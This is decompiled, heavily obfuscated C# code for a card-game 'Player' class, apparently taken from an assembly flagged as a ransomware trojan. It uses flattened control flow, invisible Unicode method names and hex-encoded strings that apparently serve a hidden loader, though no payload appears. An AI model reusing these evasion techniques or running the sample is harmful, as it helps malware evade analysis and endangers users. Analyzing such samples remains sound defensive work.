// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: ConcurrentS, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: BBECA65A-DDC9-4285-A0F3-1DAD9BE0ED87
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-29a2cecf014cf5640915defd5f1ca82e75089ad0ec89107be8f9144673d99be6.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
      string str1 = (string) null;
label_1:
      int num1 = -1723777765;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -444942501)) % 11U)
        {
          case 0:
            num1 = (int) num2 * 694751925 ^ -2030700325;
            continue;
          case 1:
            int num3 = BaseStream != 0 ? 1039382148 : (num3 = 1576136562);
            num1 = num3 ^ (int) num2 * -1873884978;
            continue;
          case 2:
            str1 = "794664687358375471";
            num1 = (int) num2 * -1787511806 ^ 1708543728;
            continue;
          case 3:
            str2 = str1;
            num1 = -1654430364;
            continue;
          case 4:
            num1 = (int) num2 * 1887638417 ^ 919587760;
            continue;
          case 5:
            num1 = (int) num2 * -1979121146 ^ -817538447;
            continue;
          case 6:
            str1 = "446573657269616C697A6174696F6E4576656E7448616E646C";
            num1 = (int) num2 * 1749570716 ^ -517164705;
            continue;
          case 7:
            num1 = (int) num2 * 290935089 ^ -1455906004;
            continue;
          case 8:
            goto label_1;
          case 10:
            int num4;
            num1 = num4 = BaseStream == 1 ? -892406115 : (num4 = -1597500073);
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
label_1:
      int num1 = 990354298;
      int num2;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num1 ^ 1088213678)) % 5U)
        {
          case 0:
            goto label_1;
          case 2:
            if (this.PlanningCards.Length == 0)
            {
              num1 = (int) num3 * -288976127 ^ -154955933;
              continue;
            }
            num4 = this.PlanningCards[cardTypeIndex];
            break;
          case 3:
            num1 = (int) num3 * 598931771 ^ 993220236;
            continue;
          case 4:
            num4 = 0;
            break;
          default:
            goto label_9;
        }
        num2 = num4;
        num1 = 600376837;
      }
label_9:
      return num2;
    }

    public int PlanningCardsCount
    {
      get
      {
label_1:
        int num1 = 415230942;
        int[] planningCards;
        int index;
        int num2;
        int num3;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num1 ^ 8366916)) % 11U)
          {
            case 0:
              num2 = planningCards[index];
              num1 = 534942874;
              continue;
            case 1:
              ++num3;
              num1 = (int) num4 * -1752575356 ^ -905674428;
              continue;
            case 2:
              goto label_1;
            case 3:
              planningCards = this.PlanningCards;
              index = 0;
              num1 = (int) num4 * 290648759 ^ 1070911580;
              continue;
            case 4:
              int num5;
              num1 = num5 = index < planningCards.Length ? 725791916 : (num5 = 971402829);
              continue;
            case 5:
              num3 = 0;
              num1 = (int) num4 * 1805795140 ^ 2146237328;
              continue;
            case 7:
              planningCardsCount = num3;
              num1 = (int) num4 * 208743501 ^ 2004447659;
              continue;
            case 8:
              ++index;
              num1 = 520930488;
              continue;
            case 9:
              num1 = (int) num4 * 1820474861 ^ -1026020789;
              continue;
            case 10:
              int num6 = num2 > 0 ? -301645101 : (num6 = -698389374);
              num1 = num6 ^ (int) num4 * -1698779545;
              continue;
            default:
              goto label_12;
          }
        }
label_12:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
      string str1 = " ";
label_1:
      int num1 = -128372181;
      int index;
      string str2;
      bool flag1;
      int planningCard;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1393935018)) % 12U)
        {
          case 0:
            planningCard = this.PlanningCards[index];
            flag1 = planningCard == 0;
            num1 = -350572668;
            continue;
          case 1:
            index = 0;
            num1 = (int) num2 * 1928787469 ^ 1289112080;
            continue;
          case 3:
            num1 = (int) num2 * -1403485762 ^ 1905128228;
            continue;
          case 4:
            flag2 = index < this.PlanningCards.Length;
            num1 = -1593949381;
            continue;
          case 5:
            str1 = Player.\u206D⁪‏‏⁭⁪‮‏‫‌⁮⁫​‌‎‌⁫⁬⁬⁫‪⁪⁪‍‪‪⁬​​‭⁯‭‪​⁮‭‭‪‭⁬‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -190142502;
            continue;
          case 6:
            goto label_1;
          case 7:
            str2 = str1;
            num1 = (int) num2 * 217764969 ^ 608217939;
            continue;
          case 8:
            ++index;
            num1 = -1357814490;
            continue;
          case 9:
            int num3 = !flag2 ? 146451872 : (num3 = 871875311);
            num1 = num3 ^ (int) num2 * 957851921;
            continue;
          case 10:
            int num4 = flag1 ? -848534825 : (num4 = -969236547);
            num1 = num4 ^ (int) num2 * 902296185;
            continue;
          case 11:
            num1 = (int) num2 * 939480308 ^ 448104966;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
label_1:
      int num1 = -891041221;
      Player player;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1187843908)) % 3U)
        {
          case 1:
            player = new Player()
            {
              Name = json["name"].Value,
              PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
              UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
            };
            num1 = (int) num2 * 437208055 ^ 1838710193;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = 799372273;
      int count;
      int aIndex;
      bool flag;
      int[] numArray;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 628863442)) % 10U)
        {
          case 0:
            numArray = new int[count];
            num1 = (int) num2 * 402052046 ^ 4212599;
            continue;
          case 1:
            count = json.Count;
            num1 = (int) num2 * -437695511 ^ 1516568347;
            continue;
          case 2:
            flag = aIndex < count;
            num1 = 1953831650;
            continue;
          case 3:
            aIndex = 0;
            num1 = (int) num2 * -1147994432 ^ -1307516838;
            continue;
          case 4:
            int num3 = flag ? -713791541 : (num3 = -1338199794);
            num1 = num3 ^ (int) num2 * -1571716720;
            continue;
          case 6:
            planningCards = numArray;
            num1 = (int) num2 * -1975934684 ^ -1542308881;
            continue;
          case 7:
            goto label_1;
          case 8:
            ++aIndex;
            num1 = (int) num2 * -447127474 ^ 641141454;
            continue;
          case 9:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = 1094805524;
            continue;
          default:
            goto label_11;
        }
      }
label_11:
      return planningCards;
    }

    public override string ToString() => Player.\u202E⁮‫‫⁮⁪⁫‫‌‍‍‪‍⁬‎⁯⁮⁬‍‮⁭‌​‎⁮‍‍⁫‪⁫​‌⁫‍⁪⁫‍⁫‎⁯‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);

    static string \u206D⁪‏‏⁭⁪‮‏‫‌⁮⁫​‌‎‌⁫⁬⁬⁫‪⁪⁪‍‪‪⁬​​‭⁯‭‪​⁮‭‭‪‭⁬‮([In] string[] obj0) => string.Concat(obj0);

    static string \u202E⁮‫‫⁮⁪⁫‫‌‍‍‪‍⁬‎⁯⁮⁬‍‮⁭‌​‎⁮‍‍⁫‪⁫​‌⁫‍⁪⁫‍⁫‎⁯‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
